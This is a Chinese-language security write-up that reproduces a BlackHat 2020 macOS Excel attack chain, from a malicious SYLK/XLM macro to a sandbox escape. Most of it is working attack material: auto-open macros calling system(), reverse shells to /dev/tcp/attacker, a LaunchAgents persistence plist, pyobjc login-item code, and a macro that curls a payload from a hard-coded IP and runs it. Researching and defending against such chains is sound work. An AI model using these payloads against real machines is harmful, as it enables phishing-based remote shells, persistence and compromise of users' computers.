**作者：t1ddl3r@百度蓝军  
公众号：[百度安全应急响应中心](https://mp.weixin.qq.com/s/a_0Vbnr38drTZAlQfoH10A
"百度安全应急响应中心")**

### 前言

在正面防御越来越难突破的今天，各种钓鱼姿势层出不穷。本月的BlackHat
2020大会上出现了一种新型的macOS下的excel宏攻击，通过巧妙的漏洞链绕过了Mac沙箱，最终获得了一枚反弹shell。笔者在研究过程中遇到了一些坑点，最终成功复现。希望文章中的一些经验能够起到抛砖引玉的作用。

### 1.XLM宏与Sylk文件

Sylk文件是一种古老的office文件格式，虽然如今已经几乎不再使用此格式，但office仍然支持打开该格式的文件。在macOS下，双击.slk文件会默认调起Excel打开。

在Sylk文件中，VBA宏会失效，它支持另一种古老的XLM宏。一个恶意的XLM宏如下：

    
    
    ID;P
    O;E
    NN;NAuto_open;ER101
    C;X1;Y101;K0;ECALL("libc.dylib","system","JC","curl http://www.toutiao.com/")
    C;X1;Y102;K0;EHALT()
    E

其中第一行是Sylk文件标记，第二行表示此文档启用了XLM宏，第三行表示文档打开时，自动执行文档中第101行的代码。后面的X与Y指代单元格坐标，如『C;X1;Y101』代表101行第1列的单元格，而『;E』代表表达式，后面跟随的为XLM宏的表达式值。

『CALL("libc.dylib","system","JC","curl http://www.toutiao.com")』
表示调用libc.dylib中的system命令执行其后的bash命令。宏命令必须以HALK()或RETURN()结束，即第四行。结尾的E表示E标记结束。

将其另存为poc.slk文件，直接运行，便会在打开文件时执行curl http://www.toutiao.com。

在Mac Office
2011中，打开此文件时不会有任何危险提示，直接运行恶意命令，不过微软已经停止了对2011的支持，并且网上已经很难下载到2011版本。在Mac Office
2016/2019中（现已修复），若用户将偏好设置-安全性-宏安全性设置为『禁用所有宏，并且不通知』，恶意宏命令也将自动执行。可惜的是，此设置并非默认的（默认为『禁用所有宏，并发出通知』）。
![](https://images.seebug.org/content/images/2020/08/aca59c83-52cd-4178-94d8-45c2dfdeff3d.jpg-w331s)
尽管如此，这也会比Windows上的宏攻击更容易成功。在Windows中，只有用户主动点击安全警告中的启用内容时，宏才会被执行。而由于安全警告并不影响文档的正常使用，普通用户一般也不会主动启用宏。
![](https://images.seebug.org/content/images/2020/08/5588b3b2-40aa-46aa-ac45-b4e1e87b3458.jpg-w331s) 而内置XLM宏的Sylk文件被打开时，Mac Office
2016/2019默认设置下会发出弹窗安全警告：
![](https://images.seebug.org/content/images/2020/08/b64a6a2b-d7d5-46bd-9852-05a81b1d8e7d.jpg-w331s)
用户必须在启用宏和禁用宏中选择一个才能继续使用文档。这就意味着，在普通用户缺乏安全意识的情况下，有50%的几率中招。

### 2.执行恶意命令

我们将宏代码修改为反弹shell的代码：

    
    
    ID;P
    O;E
    NN;NAuto_open;ER101
    C;X1;Y101;K0;ECALL("libc.dylib","system","JC", "/bin/sh -i >& /dev/tcp/attacker/8911 0>&1")
    C;X1;Y102;K0;EHALT()
    E

运行后attacker上会收到一个反弹shell，而运行此文件的mac将直接卡死。这是因为bash
-i会阻塞后续代码的运行，在编写宏时应特别注意这一点，否则会有一种受到了DOS攻击的表现。我们将代码修改为后台运行的反弹shell：

    
    
    ID;P
    O;E
    NN;NAuto_open;ER101
    C;X1;Y101;K0;ECALL("libc.dylib","system","JC", "/bin/sh -c '(/bin/sh -i >& /dev/tcp/attacker/8911 0>&1 &)'")
    C;X1;Y102;K0;EHALT()
    E

成功收到一个反弹shell，且文档关闭后反弹shell仍可正常运行。

    
    
    sh-3.2$ pwd
    /Users/yu/Library/Containers/com.microsoft.Excel/Data
    sh-3.2$ ls
    Desktop
    Documents
    Downloads
    Library
    Movies
    Music
    Pictures
    logs
    sh-3.2$ cd /Users/yu
    sh-3.2$ ls
    ls: .: Operation not permitted

经过一系列测试发现，此时反弹shell处于Excel的沙盒内。当处于com.microsoft.Excel/Data内时，bash功能正常；当想切换出沙盒目录时，虽然切换目录成功，但无法执行其他有效操作。这大大降低了shell的作用，即使由shell派生出新的进程，该子进程也将继承父进程的沙盒特性，除非我们能够让一个不在沙盒中的进程主动启动反弹shell。

### 3.沙盒逃逸

沙盒逃逸是这个议题主要的价值所在，但在复现过程中，笔者发现仅靠原作者的方式难以将整个漏洞利用链打通，故有了各种踩坑尝试。

##### 3.1 plist

使用codesign查看Excel的权限：

    
    
    codesign --display -v --entitlement - /Applications/Microsoft\ Excel.app

可以看到允许写入文件名以『~$』开始的文件：

    
    
    (allow file-read* file-write*
         (require-all (vnode-type REGULAR-FILE) (regex #"(^|/)~\$[^/]+$"))
    )

这是典型的office临时文件的文件名格式。尝试在沙盒外生成一个符合规则的文件：

    
    
    sh-3.2$ pwd
    /Users/yu
    sh-3.2$ echo "t1ddl3r">\~\$hello
    sh-3.2$ cat \~\$hello
    t1ddl3r
    sh-3.2$

成功写入，不会再像之前是『Operation not
permitted』的状态。由此，所有涉及增删改查和执行的文件操作命令，一旦所操作的文件的文件名符合上述规则，便可成功执行。当然，如果操作的是文件夹就不可以。

根据此特性，我们可以向『~/Library/LaunchAgents』写入一个plist文件，待下次mac启动后，就会自动运行此plist文件，执行我们写入的命令，此时由于命令是由plist拉起的，而并非Excel派生的，便不再处于Excel沙盒之下了。plist文件如下：

    
    
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
    <plist version="1.0">
    <dict>
    <key>Label</key>
    <string>com.microsoft</string>
    <key>ProgramArguments</key>
    <array>
    <string>/bin/bash</string>
    <string>-c</string>
    <string>bash -i >& /dev/tcp/attcker/8911 0>&1</string>
    </array>
    <key>KeepAlive</key>
    <true/>
    <key>RunAtLoad</key>
    <true/>
    <key>StartInterval</key>
    <integer>1</integer>
    </dict>
    </plist>

当mac启动时，会自动执行『/bin/bash -c bash -i >& /dev/tcp/attcker/8911
0>&1』，且会每秒执行一次（由于命令会阻塞，实际上会表现为断线后立即重连）。由于向~/Library/LaunchAgents下写入plist并不需要高权限，这也成为mac下持久化的常用手段。
**但可惜的是，微软在2018年12月发布的Excel for Mac 16.20.0中修复了这个漏洞，在权限设置中特别禁止了在此目录下创建任何文件：**

    
    
    (deny file-write*
         (subpath (string-append (param "_HOME") "/Library/Application Scripts"))
         (subpath (string-append (param "_HOME") "/Library/LaunchAgents"))
    )

因此我们不能再使用这种手段进行沙盒逃逸。

3.2 login item 那么除了使用plist文件，macOS下还有哪些手段能够自启动呢？答案是login item。
![](https://images.seebug.org/content/images/2020/08/348c90e8-5f9e-4dce-9a81-0f0b8ed5bdd9.jpg-w331s)
因为在沙盒环境下还是可以执行部分系统命令的，只要将反弹shell的程序添加到login
item中，在系统启动时，反弹shell的进程便会由loginwindow派生出来，从而绕过沙盒。

那么如何将程序添加到login
item中呢？原作者给出的方案是下载并运行一个恶意的python文件，使用pyobjc来通过python调用Objective-C的API，从而将程序添加到login item中。

    
    
    CoreServices.LSSharedFileListInsertItemURL( loginItems, kLSSharedFileListItemLast, None, None, appURL, None, None)

但很遗憾，默认的pyobjc中并没有CoreServices这个框架，虽然在官方文档中提及了这个模块，但如果要使用需要主动安装。而mac自带的python是没有pip的（即使有在沙盒环境下也很难安装模块），所以这个方法理论上来说是行不通的。这个问题困扰了笔者良久，在BH上的演讲中，原作者对此细节也是一语带过。笔者尝试发邮件请教原作者，也未能得到回复。

经过调研发现，在macOS
10.11前，LSSharedFileListInsertItemURL存在于LaunchServices模块中，而这个模块在mac自带python中是一直附带的，不过在如今流行的版本中，LaunchServices.LSSharedFileListInsertItemURL已经无法使用了。

那么有没有其他的途径来实现这个操作呢？mac中可以使用osascript来执行AppleScript、JavaScript等语言与系统API进行交互。一番搜索后，添加login
item的语句如下：

    
    
    /usr/bin/osascript -e 'tell application "System Events" to make new login item with properties { path: "path/to/app", hidden:false } at end'

注意这里System Events必须由双引号包裹，而XLM宏中，命令外侧也需要使用双引号包括，并且双引号转义是无效的，也即：

    
    
    C;X1;Y101;K0;ECALL("libc.dylib","system","JC", "/usr/bin/osascript -e 'tell application \"System Events\" to make new login item with properties { path: \"path/to/app\", hidden:false } at end'")

这样的语句是会报错而不能执行的，不过没关系，我们可以把执行osascript的代码放到python中或sh中，再使用XLM宏执行相应的文件，即可避免双引号冲突。最终执行结果如下：
![](https://images.seebug.org/content/images/2020/08/ccab9269-80f4-4532-bb98-e5da2af72612.jpg-w331s)
由于添加login item时会通过『System
Events』进行操作，会弹出相应的权限申请提示用户，这让本就要求苛刻的漏洞利用链更加雪上加霜，成功率大大降低。由此看来，此方法还是不可用的。

果然还是只能寄希望于pyobjc了，笔者开始查阅pyobjc的文档，希望找到一个能够直接调用系统函数的API。最终，找到了objc.loadBundleFunctions函数，其可以从NSBundle中加载函数，NSBundle常见于Mac/iOS开发中，用于加载各种资源和代码，而NSBundle在Mac
Python自带的Foundation包中，正巧可以被使用。我们可以先创建一个SharedFileList的NSBundle对象（注意这里要通过Bundle
Identifier加载资源而不是通过路径），然后从NSBundle中加载所需要的函数：

    
    
    from platform import mac_ver
    from Foundation import NSURL
    from LaunchServices import kLSSharedFileListSessionLoginItems
    
    
    if int(mac_ver()[0].split('.')[1]) > 10:
    from Foundation import NSBundle
    import objc
        shared_file_list = NSBundle.bundleWithIdentifier_('com.apple.coreservices.SharedFileList')
        f  = [
            ('LSSharedFileListCreate',              '^{OpaqueLSSharedFileListRef=}^{__CFAllocator=}^{__CFString=}@'),
            ('LSSharedFileListCopySnapshot',        '^{__CFArray=}^{OpaqueLSSharedFileListRef=}o^I'),
            ('LSSharedFileListInsertItemURL',       '^{OpaqueLSSharedFileListItemRef=}^{OpaqueLSSharedFileListRef=}^{OpaqueLSSharedFileListItemRef=}^{__CFString=}^{OpaqueIconRef=}^{__CFURL=}^{__CFDictionary=}^{__CFArray=}'),
            ('kLSSharedFileListItemBeforeFirst',    '^{OpaqueLSSharedFileListItemRef=}')
        ]
        objc.loadBundleFunctions(shared_file_list, globals(), f)
    else:
    # 10.11以下的版本直接从LaunchServices加载即可
    from LaunchServices import kLSSharedFileListItemBeforeFirst, LSSharedFileListCreate, \
            LSSharedFileListCopySnapshot, LSSharedFileListInsertItemURL

自此，即使不使用CoreServices包，LSSharedFileListInsertItemURL也可以被正常调用了。那么思路就很明确了：我们先使用curl下载python文件到/tmp下，然后执行该python文件，将程序添加到login
item中。

    
    
    ID;P
    O;E
    NN;NAuto_open;ER101
    C;X1;Y101;K0;ECALL("libc.dylib","system","JC", "curl attacker/python_payload -o /tmp/\~\$python_payload && python /tmp/\~\$python_payload")
    C;X1;Y102;K0;EHALT()
    E

执行上述代码，竟未成功！经过多次调试后发现，python在import一些库时会调用os.getcwd()，由于我们的文件处于沙盒外，因此工作路径也在沙盒外，会受到沙盒的限制，从而导致代码执行失败。

知道了原因便好规避了，将文件下载到权限较完整的沙盒目录下来即可（/Users/xxx/Library/Containers/com.microsoft.Excel/Data)，甚至因为处于沙盒路径内，文件名都不会收到限制了：

    
    
    ID;P
    O;E
    NN;NAuto_open;ER101
    C;X1;Y101;K0;ECALL("libc.dylib","system","JC", "curl 106.12.215.252/python_payload -o python_payload && python python_payload")
    C;X1;Y102;K0;EHALT()
    E

执行成功！自此，目标程序被成功添加到login item中，在用户下次登录时自动被系统调起，脱离沙盒。

##### 3.3 zip

首先要强调一点，虽然都是自启动程序，login item与plist的不同之处在于，plist可以为可执行文件传入任意参数，而login
item只是指定了要启动的程序，不能传参，否则我们只需把反弹shell的命令添加到login item中就可以了。

那么我们要把什么样的程序添加到login
item中才能达到目的呢？一个自己编写的恶意二进制程序怎么样？很可惜，由于我们自己的二进制程序都要在沙盒中生成，不论是通过curl下载还是通过python释放，其本身都会带上com.apple.quarantine属性：

    
    
    sh-3.2$ echo 1234 > payload
    sh-3.2$ chmod +x payload
    sh-3.2$ xattr payload
    com.apple.quarantine
    sh-3.2$ echo 1234 > payload.py
    sh-3.2$ xattr payload.py
    com.apple.quarantine

而GateKeeper会对所有带有com.apple.quarantine的可执行文件进行检查，若其没有合法签名，将会被禁止运行，自然也不能添加到login
item中打开。

原作者的思路是通过一个zip文件释放plist到LaunchAgents中。也就是说，虽然在沙盒环境下我们不能直接在LaunchAgents中写入plist文件，但我们可以在它的上级目录创建一个『~payload.zip生成在~/Library目录中，并将其添加到login
item中，当下次启动时，便会打开此zip自解压。通过unzip命令进行实验，发现确实可以实现向LaunchAgents文件夹中释放文件。而将所有流程打通后测试，发现并未按照预计的那样将plist释放到LaunchAgents中：
![](https://images.seebug.org/content/images/2020/08/cecee9c2-451e-4e8d-a938-9e5af94351b1.jpg-w331s)
程序新建了一个LaunchAgents
2文件夹，将plist解压到了这里面。原来zip自解压并非使用了unzip，而是归档工具，此两者对于目录中含有同名文件夹的处理是不同的。

而Mac下默认是没有LaunchAgents这个文件夹的，有些应用程序有自启动需求时，会创建这个文件夹。如果是默认没有的情况下，这个方法就能成功了。

### 4.总结

**综上，漏洞利用链成功的前提是：**

1.用户无安全意识选择启用宏

2.没有应用程序向~/Library下创建LaunchAgents文件夹

**漏洞利用链如下：**

1.用户选择执行宏

2.通过curl下载一个python文件到沙盒路径下，再下载一个构造好的~$payload.zip到~/Library目录下

3.执行这个python文件，将~/Library/~$payload.zip添加到login item中

4.当用户下次登录时（必须注销或关机重启），~$payload.zip被解压，释放plist文件到~/Library/LaunchAgents中

5.再下次mac重启时，plist文件被执行，反弹shell到指定目标，成功绕过沙盒
对于防御此类攻击，原作者给出的方法是监视进程和监视持久化文件两种方式，还顺带推广了一波自研的BlockBlock。实际上，有一种四两拨千斤的防御方式：只要提前向~/Library下创建LaunchAgents文件夹，使漏洞链无法完成就可以了。

### reference

<https://www.blackhat.com/us-20/briefings/schedule/#office-drama-on-macos-20854>  
<https://stackoverflow.com/questions/4912212>  
<https://stackoverflow.com/questions/29345341>  
<https://objective-see.com/blog/blog_0x4B.html>

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/1307/>

